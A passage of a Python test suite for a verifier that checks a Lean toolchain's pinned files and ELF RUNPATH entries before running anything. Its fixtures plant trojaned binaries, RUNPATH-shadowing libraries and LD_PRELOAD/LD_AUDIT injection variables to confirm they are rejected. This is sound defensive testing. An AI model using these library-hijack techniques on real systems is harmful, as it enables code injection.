        # `$ORIGINX` / `$ORIGIN_` are not DSTs and stay CWD-relative literals.
        for runpath, needle in (
            (["$ORIGIN/../lib/lean", ""], "bin/lean: empty DT_RUNPATH/DT_RPATH component (glibc ld.so searches the current working directory)"),
            ([""], "bin/lean: empty DT_RUNPATH/DT_RPATH component"),
            (["", "$ORIGIN/../lib/lean"], "bin/lean: empty DT_RUNPATH/DT_RPATH component"),
            (["$ORIGINX/../lib/lean"], "bin/lean: unsupported DT_RUNPATH entry '$ORIGINX/../lib/lean'"),
            (["$ORIGIN_/../lib/lean"], "bin/lean: unsupported DT_RUNPATH entry '$ORIGIN_/../lib/lean'"),
            (["${ORIGIN/../lib/lean"], "bin/lean: unsupported DT_RUNPATH entry '${ORIGIN/../lib/lean'"),
        ):
            with self.subTest(runpath=runpath):
                self.repin_bin_lean(make_elf64(["libleanshared.so"], runpath))
                self.assertRejected(self.verify, needle, "skipped `bin/lean --version`", absent=("SHA-256 mismatch",))
        # Control: real DSTs (`${ORIGIN}`, `$ORIGIN` followed by `/`) are accepted
        # and the run reaches the exec gate (EM_BPF, so it cannot actually run).
        self.repin_bin_lean(make_elf64(["libleanshared.so"], ["${ORIGIN}/../lib/lean", "$ORIGIN/../lib"]))
        self.assertRejected(self.verify, "cannot execute `bin/lean --version`", absent=("RUNPATH", "DT_", "SHA-256 mismatch"))

    def test_runpath_shadow_planted_inside_lib_lean_rejected_and_not_executed(self) -> None:
        # A `.so` planted inside lib/lean/ is neither pinned nor a trusted ELF input.
        self.repin_bin_lean(make_elf64(["libleanshared.so", "libz.so.1"], ["$ORIGIN/../lib/lean"]))
        planted = self.tc / "lib" / "lean" / "libz.so.1"
        planted.write_bytes(b"\x7fELF-trojan-zlib-in-lib-lean")
        os.chmod(planted, 0o644)
        self.assertRejected(
            self.verify,
            "RUNPATH shadowing: bin/lean needs 'libz.so.1', which ld.so can resolve to the unpinned toolchain file lib/lean/libz.so.1",
            "skipped `bin/lean --version`",
            absent=("SHA-256 mismatch",),
        )
        self.assertRejected(
            lambda: self.verify(toolchain_pin_json=None),
            "unpinned non-Lean shared library in lib/lean/: lib/lean/libz.so.1",
            "RUNPATH shadowing: bin/lean needs 'libz.so.1', which ld.so can resolve to the unpinned toolchain file lib/lean/libz.so.1",
            "skipped `bin/lean --version`",
        )


class ElfDynamicParserTests(TempCase):
    def put(self, data: bytes, name: str = "obj.so") -> Path:
        path = self.tmp / name
        path.write_bytes(data)
        return path

    def test_synthetic_elf_needed_runpath_and_rpath_parsed(self) -> None:
        self.assertEqual(
            V.elf_dynamic_info(self.put(make_elf64(["libfoo.so", "libc.so.6"], ["$ORIGIN/../lib", "${ORIGIN}"]))),
            (("libfoo.so", "libc.so.6"), ("$ORIGIN/../lib", "${ORIGIN}")),
        )
        self.assertEqual(V.elf_dynamic_info(self.put(make_elf64(["libbar.so"], ["/opt/a", "/opt/b"], rpath_tag=15))), (("libbar.so",), ("/opt/a", "/opt/b")))
        self.assertEqual(V.elf_dynamic_info(self.put(make_elf64([], []))), ((), ()))
        # Empty components survive parsing (glibc: empty element = current directory).
        self.assertEqual(V.elf_dynamic_info(self.put(make_elf64(["libfoo.so"], ["$ORIGIN", ""]))), (("libfoo.so",), ("$ORIGIN", "")))
        self.assertEqual(V.elf_dynamic_info(self.put(make_elf64(["libfoo.so"], [""]))), (("libfoo.so",), ("",)))
        self.assertIsNone(V.elf_dynamic_info(self.put(b"#!/bin/sh\necho hi\n", "script")))

    def test_malformed_or_unsupported_elf_raises(self) -> None:
        for label, data, needle in malformed_elf_cases():
            with self.subTest(label):
                with self.assertRaisesRegex(ValueError, needle):
                    V.elf_dynamic_info(self.put(data))

    def test_check_trusted_struct_free_parser_matches_the_verifier(self) -> None:
        images = [
            make_elf64(["libfoo.so", "libc.so.6"], ["$ORIGIN/../lib", "${ORIGIN}"]),
            make_elf64(["libbar.so"], ["/opt/a", "/opt/b"], rpath_tag=15),
            make_elf64(["libz.so.1"], ["$ORIGIN/../lib"], rpath=["$ORIGIN/../lib/lean"]),
            make_elf64([], []),
            make_elf64(["libfoo.so"], ["$ORIGIN", ""]),
            b"#!/bin/sh\necho hi\n",
        ]
        for index, data in enumerate(images):
            with self.subTest(index=index):
                path = self.put(data, f"img{index}")
                self.assertEqual(CT.elf_dynamic_info(path), V.elf_dynamic_info(path))
        for label, data, needle in malformed_elf_cases():
            with self.subTest(label):
                with self.assertRaisesRegex(ValueError, needle):
                    CT.elf_dynamic_info(self.put(data))

    def test_parser_and_runpath_parity_on_randomized_inputs(self) -> None:
        """Seeded differential parity of the two ELF64 parsers (on corrupted and
        truncated synthetic images) and of the two `DT_RUNPATH` entry validators, so
        the security invariants of `check_trusted.py` and the verifier cannot drift."""
        rng = random.Random(20261117)
        names = ["libfoo.so", "libc.so.6", "", "a/b.so", "libleanshared_1.so"]
        entries = ["$ORIGIN", "$ORIGIN/../lib", "${ORIGIN}/x", "", "/abs", "$LIB", "$ORIGINX"]
        flags = ("strtab_outside_load", "strtab_in_nobits", "unterminated", "unterminated_within_strsz",
                 "needed_index_oob", "runpath_index_oob", "strsz_overrun", "omit_strtab",
                 "load_filesz_gt_memsz", "overlapping_loads", "omit_dt_null", "dyn_outside_load")

        def outcome(parse: Callable[[Path], Any], path: Path) -> Tuple[str, Any]:
            try:
                return "ok", parse(path)
            except (ValueError, struct.error):
                return "rejected", None

        for index in range(1500):
            kw: Dict[str, Any] = {flag: True for flag in flags if rng.random() < 0.08}
            if rng.random() < 0.05:
                kw["phentsize"] = rng.choice([0, 32, 55, 57, 64])
            if rng.random() < 0.05:
                kw["phnum_override"] = rng.choice([0, 1, 3, 0xFFFF, 5000])
            data = bytearray(make_elf64(rng.sample(names, rng.randint(0, 3)), rng.sample(entries, rng.randint(0, 3)),
                                        rpath=rng.sample(entries, rng.randint(0, 2)), **kw))
            for _ in range(rng.choice([0, 0, 1, 2, 4])):
                data[rng.randrange(len(data))] = rng.randrange(256)
            if rng.random() < 0.1:
                data = data[: rng.randrange(len(data))]
            path = self.put(bytes(data), f"fuzz{index}")
            self.assertEqual(outcome(CT.elf_dynamic_info, path), outcome(V.elf_dynamic_info, path), (index, kw))
        root = self.tmp / "root"
        (root / "bin").mkdir(parents=True)
        (root / "lib" / "lean").mkdir(parents=True)
        os.symlink("/etc", root / "lib" / "escape")
        real_root, origin = os.path.realpath(root), str(root / "bin")
        for entry in ("", "$ORIGIN", "${ORIGIN}", "$ORIGIN/..", "$ORIGIN/../lib", "$ORIGIN/../lib/lean", "$ORIGIN/../lib/escape",
                      "$ORIGIN/../lib/..", "$ORIGIN/../../x", "$ORIGIN//lib", "$ORIGIN/../lib/", "$ORIGIN/./lib", "$ORIGINX",
                      "${ORIGIN", "$LIB", "/abs", real_root + "/lib", real_root + "/lib/../lib", "$ORIGIN$ORIGIN", "lib",
                      real_root, real_root + "/", "$ORIGIN/..//lib", "${ORIGIN}/../lib/lean"):
            with self.subTest(entry=entry):
                self.assertEqual(CT._validate_runpath_entry(entry, origin, real_root), V._validate_runpath_entry(entry, origin, real_root))


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


class CliTests(TempCase):
    def run_cli(self, *args: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, "-B", str(VERIFIER_PATH), *args],
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=600,
            check=False,
        )

    def test_cli_json_dump_verify_and_tamper(self) -> None:
        ws = self.workspace()
        tc = make_fake_toolchain(self.tmp)
        pin = self.tmp / "pin.json"
        ok = self.run_cli("--repo-root", str(ws.root), "--toolchain-dir", str(tc), "--allow-deinit-patch", "--dump-toolchain-pin", str(pin), "--json")
        self.assertEqual(ok.returncode, 0, ok.stdout + ok.stderr)
        summary = json.loads(ok.stdout)
        self.assertEqual((summary["verified_vendor_files"], summary["verified_aux_files"]), (608, 9))
        self.assertEqual(summary["dumped_toolchain_pin"], str(pin))
        self.assertEqual(json.loads(pin.read_text())["files"], summary["toolchain"]["sha256"])
        (tc / "lib" / "lean" / "libleanshared_2.so").write_bytes(b"swapped")
        bad = self.run_cli("--repo-root", str(ws.root), "--toolchain-dir", str(tc), "--allow-deinit-patch", "--toolchain-pin-json", str(pin), "--json")
        self.assertEqual(bad.returncode, 1, bad.stdout + bad.stderr)
        failure = json.loads(bad.stdout)
        self.assertIs(failure["ok"], False)
        self.assertTrue(any("SHA-256 mismatch for lib/lean/libleanshared_2.so" in e for e in failure["errors"]), failure)

    def test_cli_patch_modes_and_human_output(self) -> None:
        ws = self.workspace()
        tc = make_fake_toolchain(self.tmp)
        strict = self.run_cli("--repo-root", str(ws.root), "--toolchain-dir", str(tc))
        self.assertEqual(strict.returncode, 1, strict.stdout + strict.stderr)
        self.assertIn("lean-miri pin verification FAILED", strict.stderr)
        self.assertIn("strict mode", strict.stderr)
        patched = self.run_cli("--repo-root", str(ws.root), "--toolchain-dir", str(tc), "--allow-deinit-patch")
        self.assertEqual(patched.returncode, 0, patched.stdout + patched.stderr)
        self.assertIn("verified_vendor_files: 608", patched.stdout)
        self.assertIn("patched_files: 10", patched.stdout)
        self.assertIn("(deinit patch lock: matched)", patched.stdout)
        locked = self.run_cli("--repo-root", str(ws.root), "--toolchain-dir", str(tc), "--require-locked-deinit-patch")
        self.assertEqual(locked.returncode, 0, locked.stdout + locked.stderr)
        self.assertIn("lean-miri pin verification OK (mode=locked-deinit-patch)", locked.stdout)

    def test_cli_synthetic_full_overlay_rejected_by_the_lock(self) -> None:
        ws = self.upstream_workspace()
        tc = make_fake_toolchain(self.tmp)
        ws.apply_overlay(ALLOWLIST)
        for flag in ("--allow-deinit-patch", "--require-locked-deinit-patch"):
            with self.subTest(flag):
                proc = self.run_cli("--repo-root", str(ws.root), "--toolchain-dir", str(tc), flag, "--json")
                self.assertEqual(proc.returncode, 1, proc.stdout + proc.stderr)
                self.assertTrue(any("locked deinit patch" in e for e in json.loads(proc.stdout)["errors"]))
        ws.restore_upstream()
        ws.apply_overlay(ALLOWLIST[:3])
        subset = self.run_cli("--repo-root", str(ws.root), "--toolchain-dir", str(tc), "--allow-deinit-patch", "--json")
        self.assertEqual(subset.returncode, 0, subset.stdout + subset.stderr)
        self.assertEqual(json.loads(subset.stdout)["deinit_patch_lock"], "subset")

    def test_cli_rejects_bad_arguments(self) -> None:
        proc = self.run_cli("--expected-pin-sha256", "nothex")
        self.assertEqual(proc.returncode, 2)
        ws = self.workspace()
        tc = make_fake_toolchain(self.tmp)
        wrong = self.run_cli("--repo-root", str(ws.root), "--toolchain-dir", str(tc), "--allow-deinit-patch", "--expected-pin-sha256", "0" * 64, "--json")
        self.assertEqual(wrong.returncode, 1)
        self.assertTrue(any("[identity] lean-miri/UPSTREAM_PIN.json SHA-256" in e for e in json.loads(wrong.stdout)["errors"]))


# ---------------------------------------------------------------------------
# trusted/audit/check_trusted.py integration (standalone embedded copy)
# ---------------------------------------------------------------------------

#: The import allowlist `tools/anneal-lsp/server/test_proof_health.py` enforces.
CHECK_TRUSTED_ALLOWED_IMPORTS = {
    "__future__", "argparse", "bisect", "hashlib", "json", "os", "pathlib", "re", "shutil",
    "stat", "subprocess", "sys", "tempfile", "time", "tomllib", "typing", "test_boundary",
}


class CheckTrustedIntegrationTests(TempCase):
    """`Checker` must reject tampered toolchains, root manifests and lean-miri
    vendor trees BEFORE any Lean process: `execution_began` stays False, no
    `*.status.json` exists and `subprocess.run` is never called."""

    def checker(self, root: Path, lean: Path) -> Any:
        checker = CT.Checker(root, lean, temp_parent=self.tmp)
        self.addCleanup(CT.make_tree_writable, checker.stage)
        return checker

    def assertRejectedBeforeExecution(self, checker: Any, code: int, phase: str, *needles: str) -> Any:
        with mock.patch.object(CT.subprocess, "run", side_effect=AssertionError("a subprocess was spawned")) as run:
            with self.assertRaises(CT.Failure) as cm:
                checker.run()
        error = cm.exception
        self.assertEqual((error.code, error.phase), (code, phase), str(error))
        for needle in needles:
            self.assertIn(needle, str(error))
        run.assert_not_called()
        self.assertFalse(checker.execution_began)
        self.assertEqual(sorted(p.name for p in checker.stage.glob("*.status.json")), [])
        return error

    def run_until_first_lean_process(self, checker: Any) -> List[Tuple[str, List[str]]]:
        calls: List[Tuple[str, List[str]]] = []

        def first_process(label: str, arguments: List[str], *, executable: Optional[Path] = None) -> str:
            calls.append((label, list(arguments)))
            raise ReachedFirstLeanProcess(label)

        with mock.patch.object(checker, "process", side_effect=first_process):
            with self.assertRaises(ReachedFirstLeanProcess):
                checker.run()
        self.assertFalse(checker.execution_began)
        return calls

    # -- standalone embedding ------------------------------------------------

    def test_check_trusted_is_standalone_stdlib_only(self) -> None:
        text = CHECK_TRUSTED_PATH.read_text(encoding="utf-8")
        tree = ast.parse(text)
        imported = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                imported.update(alias.name.split(".")[0] for alias in node.names)
            elif isinstance(node, ast.ImportFrom) and node.module:
                imported.add(node.module.split(".")[0])
        self.assertLessEqual(imported, CHECK_TRUSTED_ALLOWED_IMPORTS, imported - CHECK_TRUSTED_ALLOWED_IMPORTS)
        # No dynamic loading of `scripts/` helpers: the only sys.path edit is the
        # `--self-test` harness directory, and nothing calls `__import__` / `exec`.
        path_edits = [ast.unparse(node) for node in ast.walk(tree)
                      if isinstance(node, ast.Call) and ast.unparse(node.func) in ("sys.path.insert", "sys.path.append")]
        self.assertEqual(path_edits, ["sys.path.insert(0, str(checkout / 'tests/trusted-boundary'))"])
        self.assertFalse([node for node in ast.walk(tree) if isinstance(node, ast.Name) and node.id in ("__import__", "exec", "dataclass")])
        # The pure-Python verifiers are defined in check_trusted.py itself.
        defined = {node.name for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)}
        self.assertLessEqual({"verify_root_manifest", "verify_lean_miri_pin", "admit_lean_before_execution",
                              "lean_release_findings", "runpath_shadowing_findings", "elf_dynamic_info"}, defined)

    def test_check_trusted_embeds_the_same_locked_constants(self) -> None:
        self.assertEqual(CT.LOCKED_DEINIT_PATCHED_FILES, {p: dict(e) for p, e in V.LOCKED_DEINIT_PATCHED_FILES.items()})
        self.assertEqual(CT.LOCKED_LEAN_RELEASE["files"], dict(V.LOCKED_TOOLCHAIN_PINS[CT.TOOLCHAIN]["files"]))
        self.assertEqual(CT.LOCKED_LEAN_RELEASE["directory"], V.toolchain_dir_name(CT.TOOLCHAIN))
        self.assertEqual(CT.TOOLCHAIN, REPO_TOOLCHAIN)
        self.assertEqual(CT.LEAN_RELEASE_RUNPATH_BINARIES, V.RUNPATH_CHECKED_BINARIES)
        identity = dict(V.LOCKED_UPSTREAM_IDENTITY)
        for key in ("repository", "commit", "upstream_lean_toolchain", "upstream_pins", "upstream_git_objects", "vendor_tree.file_count", "vendor_tree.manifest_sha256"):
            self.assertEqual(CT.LOCKED_LEAN_MIRI_PIN[key], identity[key], key)
        self.assertEqual(CT.LOCKED_LEAN_MIRI_PIN["upstream_git_objects"]["Miri"], LOCKED_MIRI_TREE)
        # The build toolchain is locked identically: check_trusted's `TOOLCHAIN` is the
        # only toolchain with compiled-in release digests in the verifier.
        self.assertEqual(sorted(V.LOCKED_TOOLCHAIN_PINS), [CT.LOCKED_LEAN_MIRI_PIN["build_lean_toolchain"]])
        self.assertEqual(CT.LOCKED_LEAN_MIRI_PIN["build_lean_toolchain"], CT.TOOLCHAIN)
        lock = json.loads((REPO_ROOT / "trusted" / "lean" / "foundation-lock.json").read_text())
        self.assertIn(CT.LOCKED_LEAN_RELEASE["files"]["bin/lean"], lock["distributions"].values())

    # -- toolchain admission -------------------------------------------------

    def test_tampered_bin_lean_rejected_before_it_is_executed(self) -> None:
        root = make_check_trusted_fixture(self.tmp)
        sentinel = self.tmp / "trojan-lean-executed"
        for label, parent in (("arbitrary prefix", self.tmp / "fake-prefix"), ("elan toolchain name", self.tmp / "elan" / "toolchains" / CT.LOCKED_LEAN_RELEASE["directory"])):
            with self.subTest(label):
                lean = parent / "bin" / "lean"
                lean.parent.mkdir(parents=True)
                lean.write_text(f"#!/bin/sh\necho pwned > {shlex.quote(str(sentinel))}\necho 'Lean (version {REPO_LEAN_VERSION}, x86_64-unknown-linux-gnu, commit {FAKE_COMMIT}, Release)'\n")
                os.chmod(lean, 0o755)
                self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", "unsupported toolchain distribution/launcher bytes", "it was not executed")
                self.assertFalse(sentinel.exists(), "the trojaned bin/lean ran before its SHA-256 was checked")

    @NEEDS_LIVE_RELEASE
    def test_live_release_admitted_and_first_lean_process_is_the_version_probe(self) -> None:
        root = make_check_trusted_fixture(self.tmp)
        self.assertEqual(CT.lean_release_findings(LIVE_TOOLCHAIN_DIR.resolve()), [])
        calls = self.run_until_first_lean_process(self.checker(root, LIVE_TOOLCHAIN_DIR / "bin" / "lean"))
        self.assertEqual(calls, [("version", ["--version"])])

    @NEEDS_LIVE_RELEASE
    def test_tampered_or_extra_libleanshared_rejected_before_version_probe(self) -> None:
        root = make_check_trusted_fixture(self.tmp)
        prefix = copy_live_toolchain(self.tmp / "elan" / "toolchains")
        lean = prefix / "bin" / "lean"
        self.assertEqual(CT.lean_release_findings(prefix), [])  # pristine byte-for-byte copy is admitted
        self.assertEqual(self.run_until_first_lean_process(self.checker(root, lean)), [("version", ["--version"])])
        lib = prefix / "lib" / "lean"
        original = (lib / "libleanshared_1.so").read_bytes()
        with self.subTest("tampered companion libleanshared_1.so"):
            (lib / "libleanshared_1.so").write_bytes(original + b"\x90")
            self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", "SHA-256 mismatch for lib/lean/libleanshared_1.so", "nothing was executed")
            (lib / "libleanshared_1.so").write_bytes(original)
        for name in ("libleanshared_evil.so", "libleanshared_3.so", "libleanshared.so.evil"):
            with self.subTest(f"added {name}"):
                shutil.copy2(lib / "libleanshared_1.so", lib / name)
                self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", f"unpinned toolchain file added: lib/lean/{name}")
                (lib / name).unlink()
        with self.subTest("hard-linked companion library"):
            hard_lib = self.tmp / "hard-libleanshared_1.so"
            os.link(lib / "libleanshared_1.so", hard_lib)
            self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", "lib/lean/libleanshared_1.so is hard-linked (st_nlink=2")
            hard_lib.unlink()
        with self.subTest("hard-linked bin/lean"):
            hard_lean = self.tmp / "hard-lean"
            os.link(lean, hard_lean)
            self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", "it is hard-linked (st_nlink=2)")
            hard_lean.unlink()
        with self.subTest("deleted libleanshared_2.so"):
            saved = self.tmp / "libleanshared_2.so"
            shutil.move(str(lib / "libleanshared_2.so"), str(saved))
            self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", "pinned toolchain file deleted: lib/lean/libleanshared_2.so")
            shutil.move(str(saved), str(lib / "libleanshared_2.so"))
        with self.subTest("tampered companion executable bin/leanc"):
            leanc = (prefix / "bin" / "leanc").read_bytes()
            (prefix / "bin" / "leanc").write_bytes(leanc + b"\0")
            self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", "SHA-256 mismatch for bin/leanc")
            (prefix / "bin" / "leanc").write_bytes(leanc)
        with self.subTest("planted extra executable bin/ld"):
            (prefix / "bin" / "ld").write_text("#!/bin/sh\nexit 0\n")
            os.chmod(prefix / "bin" / "ld", 0o755)
            self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", "unpinned toolchain file added: bin/ld")
            (prefix / "bin" / "ld").unlink()
        with self.subTest("symlinked companion library"):
            (lib / "libleanshared_2.so").unlink()
            os.symlink(LIVE_TOOLCHAIN_DIR / "lib" / "lean" / "libleanshared_2.so", lib / "libleanshared_2.so")
            self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", "symlink forbidden: lib/lean/libleanshared_2.so")
            (lib / "libleanshared_2.so").unlink()
            shutil.copy2(LIVE_TOOLCHAIN_DIR / "lib" / "lean" / "libleanshared_2.so", lib / "libleanshared_2.so")
        self.assertEqual(CT.lean_release_findings(prefix), [])

    @NEEDS_LIVE_RELEASE
    def test_planted_runpath_shadows_rejected_before_version_probe(self) -> None:
        root = make_check_trusted_fixture(self.tmp)
        prefix = copy_live_toolchain(self.tmp / "elan" / "toolchains")
        lean = prefix / "bin" / "lean"
        for planted_rel, needles in (
            ("lib/libm.so.6", ("system soname planted in a toolchain RUNPATH directory: lib/libm.so.6",
                               "RUNPATH shadowing: bin/lean needs 'libm.so.6', which ld.so can resolve to the unpinned toolchain file lib/libm.so.6")),
            ("lib/libleanshared_1.so", ("RUNPATH shadowing library in lib/ (shadows lib/lean/): lib/libleanshared_1.so",
                                        "RUNPATH shadowing: bin/lean needs 'libleanshared_1.so', which ld.so can resolve to the unpinned toolchain file lib/libleanshared_1.so")),
            ("lib/librt.so.1", ("RUNPATH shadowing: lib/lean/libleanshared.so needs 'librt.so.1'",)),
            ("lib/lean/libz.so.1", ("unpinned toolchain file added: lib/lean/libz.so.1",)),
            ("lib/lean/libpthread.so.0", ("system soname planted in a toolchain RUNPATH directory: lib/lean/libpthread.so.0",)),
        ):
            with self.subTest(planted_rel):
                planted = prefix / planted_rel
                planted.write_bytes(b"\x7fELF-trojan")
                os.chmod(planted, 0o644)
                error = self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", "pre-execution toolchain admission")
                self.assertFindings(CT.lean_release_findings(prefix), *needles)
                self.assertIn(needles[0], str(error))
                planted.unlink()
        self.assertEqual(CT.lean_release_findings(prefix), [])

    @NEEDS_LIVE_RELEASE
    def test_custom_lean_path_with_trojaned_runpath_companions_rejected_before_version_probe(self) -> None:
        """`--lean /custom/path/<dir>/lean`: a byte-for-byte copy of the locked
        `bin/lean` (so its SHA-256 *is* a foundation-lock distribution) placed under an
        arbitrary, non-elan prefix whose `../lib/libleanshared_1.so` (searched first via
        `$ORIGIN/../lib`), `../lib/libm.so.6` or `../lib/lean/libleanshared_1.so` is
        trojaned. Admission is keyed by the digest, not by the directory name, so
        `Checker.tool_admission()` must reject every variant before
        `/custom/path/.../lean --version` (or anything else) runs."""
        root = make_check_trusted_fixture(self.tmp)
        prefix = copy_live_toolchain(self.tmp / "custom", name="path")
        lean = prefix / "bin" / "lean"
        self.assertNotIn(CT.LOCKED_LEAN_RELEASE["directory"], (prefix.name, prefix.parent.name))
        self.assertEqual(CT.lean_release_findings(prefix), [])
        # Control: the pristine custom-prefix copy is admitted and the first Lean
        # process is the `--version` probe of exactly that executable.
        self.assertEqual(self.run_until_first_lean_process(self.checker(root, lean)), [("version", ["--version"])])
        trojan = b"\x7fELF-trojan: ld.so would run this constructor inside `lean --version`"
        shadow_cases = (
            ("lib/libleanshared_1.so", (
                "RUNPATH shadowing library in lib/ (shadows lib/lean/): lib/libleanshared_1.so",
                "RUNPATH shadowing: bin/lean needs 'libleanshared_1.so', which ld.so can resolve to the unpinned toolchain file lib/libleanshared_1.so",
            )),
            ("lib/libm.so.6", (
                "system soname planted in a toolchain RUNPATH directory: lib/libm.so.6",
                "RUNPATH shadowing: bin/lean needs 'libm.so.6', which ld.so can resolve to the unpinned toolchain file lib/libm.so.6",
            )),
        )
        to_dir = prefix / "to"
        to_dir.mkdir()
        os.chmod(to_dir, 0o755)
        shutil.copy2(lean, to_dir / "lean")
        self.assertEqual(V.sha256_file(to_dir / "lean"), CT.LOCKED_LEAN_RELEASE["files"]["bin/lean"])
        for planted_rel, needles in shadow_cases:
            with self.subTest(f"{planted_rel} next to a copy in <prefix>/bin/"):
                planted = prefix / planted_rel
                planted.write_bytes(trojan)
                os.chmod(planted, 0o755)
                error = self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain",
                                                           "pre-execution toolchain admission", "nothing was executed")
                for needle in needles:
                    self.assertIn(needle, str(error))
                self.assertFindings(CT.lean_release_findings(prefix), *needles)
                with self.subTest(f"{planted_rel} next to a copy in <prefix>/to/ (outside bin/)"):
                    # `$ORIGIN/../lib` of `<prefix>/to/lean` is the same trojaned `lib/`;
                    # the copy is outside the inventoried `bin/`, so it is refused outright.
                    self.assertRejectedBeforeExecution(self.checker(root, to_dir / "lean"), 2, "toolchain",
                                                       "must sit directly in its toolchain's bin/ directory",
                                                       "nothing was executed")
                planted.unlink()
        with self.subTest("tampered companion lib/lean/libleanshared_1.so"):
            companion = prefix / "lib" / "lean" / "libleanshared_1.so"
            original = companion.read_bytes()
            companion.write_bytes(original + trojan)
            error = self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain",
                                                       "SHA-256 mismatch for lib/lean/libleanshared_1.so", "nothing was executed")
            companion.write_bytes(original)
            os.chmod(companion, 0o644)
        with self.subTest("bare custom prefix: only <prefix>/to/lean and a trojaned ../lib/libleanshared_1.so"):
            bare = self.tmp / "bare" / "path"
            (bare / "to").mkdir(parents=True)
            (bare / "lib").mkdir()
            shutil.copy2(lean, bare / "to" / "lean")
            (bare / "lib" / "libleanshared_1.so").write_bytes(trojan)
            self.assertRejectedBeforeExecution(self.checker(root, bare / "to" / "lean"), 2, "toolchain",
                                               "must sit directly in its toolchain's bin/ directory")
            (bare / "bin").mkdir()
            shutil.move(str(bare / "to" / "lean"), str(bare / "bin" / "lean"))
            error = self.assertRejectedBeforeExecution(self.checker(root, bare / "bin" / "lean"), 2, "toolchain",
                                                       "pre-execution toolchain admission")
            self.assertTrue("lib/lean/ is missing" in str(error) or "pinned toolchain file deleted" in str(error), str(error))
        shutil.rmtree(to_dir)
        self.assertEqual(CT.lean_release_findings(prefix), [])
        self.assertEqual(self.run_until_first_lean_process(self.checker(root, lean)), [("version", ["--version"])])

    def test_lean_children_never_inherit_dynamic_loader_variables(self) -> None:
        """`LD_LIBRARY_PATH` is searched before `DT_RUNPATH` and `LD_PRELOAD` /
        `LD_AUDIT` inject code: `Checker` must strip them (like `DYLD_*` and like
        `_scrubbed_env` in the verifier), or the pre-execution DT_RUNPATH admission
        would be bypassed when `lean` actually runs."""
        root = make_check_trusted_fixture(self.tmp)
        hostile = {"LD_PRELOAD": str(self.tmp / "evil.so"), "LD_LIBRARY_PATH": str(self.tmp),
                   "LD_AUDIT": str(self.tmp / "audit.so"), "DYLD_INSERT_LIBRARIES": str(self.tmp / "evil.dylib"),
                   "LEAN_PATH": str(self.tmp)}
        with mock.patch.dict(os.environ, hostile):
            checker = self.checker(root, self.tmp / "bin" / "lean")
        self.assertFalse({key for key in checker.environment if key.startswith(("LD_", "DYLD_", "LEAN"))})
        self.assertEqual(checker.environment["PATH"], os.defpath)
        self.assertEqual(set(V._scrubbed_env()), {"PATH", "LC_ALL", "LANG"})

    def test_full_mode_never_executes_a_cached_compiled_inspector(self) -> None:
        """The authoritative (non-`--fast`) mode runs the staged, `freshness()`-checked
        `TrustedBoundary.lean` through `lean --run`; it must never reuse a compiled
        inspector binary from the predictable shared `/tmp/anneal-trusted-cache-<uid>`
        (which untrusted downstream elaboration, or another account, could plant)."""
        root = make_check_trusted_fixture(self.tmp)
        prefix = self.tmp / "fake-prefix"
        (prefix / "bin").mkdir(parents=True)
        (prefix / "bin" / "leanc").write_text("#!/bin/sh\nexit 0\n")
        os.chmod(prefix / "bin" / "leanc", 0o755)
        shared_tmp = self.tmp / "shared-tmp"
        shared_tmp.mkdir()
        with mock.patch.object(CT.tempfile, "gettempdir", return_value=str(shared_tmp)):
            checker = self.checker(root, prefix / "bin" / "lean")
            checker.lean = prefix / "bin" / "lean"
            checker.expected_lean_sha = CT.LOCKED_LEAN_RELEASE["files"]["bin/lean"]
            checker.inspector_hash = "0" * 64
            bin_key = CT.fingerprint({"schema": 1, "toolchain": CT.TOOLCHAIN, "leanSha256": checker.expected_lean_sha,
                                      "leancSha256": CT.digest(prefix / "bin" / "leanc"), "inspectorSha256": checker.inspector_hash})
            for base in (shared_tmp / f"anneal-trusted-cache-{os.getuid()}", shared_tmp):
                planted = base / "inspector-bin" / f"TrustedBoundary-{bin_key}"
                planted.parent.mkdir(parents=True, exist_ok=True)
                planted.write_text('#!/bin/sh\necho \'{"ok": true, "result": {}}\' > "$2"\n')
                os.chmod(planted, 0o755)
            with mock.patch.object(CT.subprocess, "run", side_effect=AssertionError("a subprocess was spawned")) as run:
                self.assertIsNone(checker._get_compiled_inspector())
            run.assert_not_called()
            self.assertFalse(checker.fast)
            self.assertIsNone(checker.cache_dir)

    def test_fast_cache_directory_must_be_private(self) -> None:
        """`--fast` reuses cached oleans, inspector results and a compiled inspector:
        a cache directory owned by another account (e.g. a pre-created predictable
        `/tmp/anneal-trusted-cache-<uid>`), world-writable, or a symlink to such a
        directory is refused at construction; a fresh one is created private; a cached
        compiled inspector that is group/world-writable is never executed."""
        root = make_check_trusted_fixture(self.tmp)
        lean = self.tmp / "bin" / "lean"

        def fast_checker(cache: Path) -> Any:
            checker = CT.Checker(root, lean, temp_parent=self.tmp, fast=True, cache_dir=cache)
            self.addCleanup(CT.make_tree_writable, checker.stage)
            return checker

        fresh = self.tmp / "fresh-cache"
        checker = fast_checker(fresh)
        self.assertEqual(checker.cache_dir, fresh.resolve())
        self.assertTrue(fresh.is_dir())
        self.assertFalse(os.lstat(fresh).st_mode & (stat.S_IWGRP | stat.S_IWOTH))
        open_cache = self.tmp / "world-writable-cache"
        open_cache.mkdir()
        os.chmod(open_cache, 0o777)
        with self.assertRaises(CT.Failure) as cm:
            fast_checker(open_cache)
        self.assertEqual((cm.exception.code, cm.exception.phase), (2, "admission"))
        self.assertIn("is world-writable", str(cm.exception))
        link = self.tmp / "symlinked-cache"
        os.symlink(open_cache, link)
        with self.assertRaises(CT.Failure) as cm:
            fast_checker(link)
        self.assertIn("is world-writable", str(cm.exception))
        foreign = self.tmp / "foreign-cache"
        foreign.mkdir(mode=0o755)
